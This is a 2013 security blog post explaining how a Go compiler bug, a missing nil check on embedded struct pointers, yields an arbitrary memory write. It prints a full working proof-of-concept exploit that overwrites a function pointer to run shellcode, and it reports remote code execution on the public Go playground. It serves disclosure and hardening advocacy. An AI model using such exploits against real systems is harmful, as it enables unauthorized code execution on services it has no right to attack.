Title: Exploiting a Go Binary
Date: 2013-04-23
Tags: golang, exploitation
Summary: Last night, tylerni7 showed us a proof of concept for a 32 bit Go exploit using <a href="https://code.google.com/p/go/issues/detail?id=464">this issue</a>. geohot and I had a wager over who could get the first remote code execution on <a href="http://play.golang.org">play.golang.org</a>: he won, but just barely ;-). Here is a summary of how we did it.

<h3>Introduction</h3>
Last night, tylerni7 showed us a proof of concept for a 32 bit Go exploit using <a href="https://code.google.com/p/go/issues/detail?id=464">this issue</a>. geohot and I had a wager over who could get the first remote code execution on <a href="http://play.golang.org">play.golang.org</a>: he won, but just barely ;-). Props also to ricky for help finding the underlying cause and updating the exploit for Go 1.03. Here is a summary of how we did it.

<h3>The Bug</h3>
<p>Go has support for embedded structs. You can define an embedded struct as follows:</p>
~~~
:::go
type Embedded struct {
   foo int
}

type Struct struct {
   Embedded
   bar int
}

var instance Struct
~~~
<p>
It is valid to do both <tt>instance.bar</tt> and <tt>instance.foo</tt>.</p>

<p>The problem comes when you try something slightly trickier:</p>
~~~
:::go
type Embedded struct {
   foo int
}

type Struct struct {
   *Embedded
   bar int
}

var instance Struct
~~~
<p>
When you access <tt>instance.foo</tt> (a member of an uninitialized struct), it incorrectly offsets from 0 rather than from the base of an <tt>Embedded</tt> struct. Normally, when dereferencing a pointer inside a struct, the go compiler
emits guard code which will cause a segfault if the pointer is nil.
However, this code is not emitted when the pointer is the first element
of the struct, since it's assumed that this will cause a segfault
whenever it is used anyway.  This assumption is not always valid, as the
pointer can be to a large struct such that the offsets of members of the large
struct are valid addresses.
</p>

<h3>The Vulnerability</h3>
<p>We define an enormous struct and use it to offset memory:</p>
~~~
:::go
type Embedded struct {
   offset [0x400100]byte
   address uint32
}

type Struct struct {
   *Embedded
   bar int
}
var instance Struct
~~~
<p>
Now we can do <tt>instance.address = 0xdeadbeef</tt> and we have written to <tt>0x400100</tt>! This is the arbitrary write primitive we need.</p>

<h3>The Exploit</h3>
<p>Once you have an arbitrary write in go, it is <em>really easy</em> to get arbitrary code execution. We put a function pointer in our data segment (we wanted to put it in the heap, but that didn't work on 64bit Go - apparently the size of a struct is limited to 32 bits. Luckily, the data segment is in the lower 32 bits) and change it to point to our shell code using the arbitrary write. Since Go has <em>no randomization</em> at all, this is as simple as running the program twice. Full exploit below:</p>
~~~
:::go
package main

import "fmt"

// Address to write, computed from a previous run.
const addr_to_overwrite = 0x50e2f0
// &shellcode, computed from a previous run.
const val_to_overwrite uint64 = 0xc200035160

type Embedded struct {
   offset [addr_to_overwrite]byte
   payload uint64
}

type Nested struct {
  // This magic is necessary is because there is an explict null check if
  // if the offset is greater than 0x1000.
  Embedded
}

type Struct struct {
 // The issue is that a reference to the embeded struct pointer here
 // will be offset from null (rather than the true base of the struct).
 // We thus just make sizeof(the embedded struct) large enough to point
 // to the address we want to overwrite.
 //
 // See https://code.google.com/p/go/issues/detail?id=464
 *Nested
}

var unused = func () {}

func main() {
 s := &Struct{}
 shellcode := "\x90\x90\x90\x90\x90\x90\x90\xeb\xfe"

 fmt.Println("You should overwrite this: ", &unused)
 fmt.Println("With this: ", &shellcode)

 fmt.Println("***********************************************");
 fmt.Println("Overwriting ", &s.payload, " with ", val_to_overwrite)

 *(&s.payload) = val_to_overwrite;
 
 unused();
}
~~~

<h3>What Now?</h3>
Well, clearly the [issue](https://code.google.com/p/go/issues/detail?id=464) should be fixed (it was closed 3 years ago as "working as intended"). I also think it is important for Go to add the protections that come now standard with C binaries (ASLR, NX) - I posted <a href="http://ppp.cylab.cmu.edu/wordpress/?p=667">an article</a> earlier about security in Go where I strongly advocated those protections. Luckily, Go 1.1. will be adding some of these protections: specificially, the above exploit will not work because <a href="https://groups.google.com/forum/?fromgroups=#!topic/golang-nuts/o2Q5oc36Qt0">Go 1.1  uses a non-executable heap and stack</a> (the vulnerability still works to give an arbitrary write, but more care is necessary to complete the exploit). The development and release versions (as of time of this writing) are still vulnerable, but good job Go!
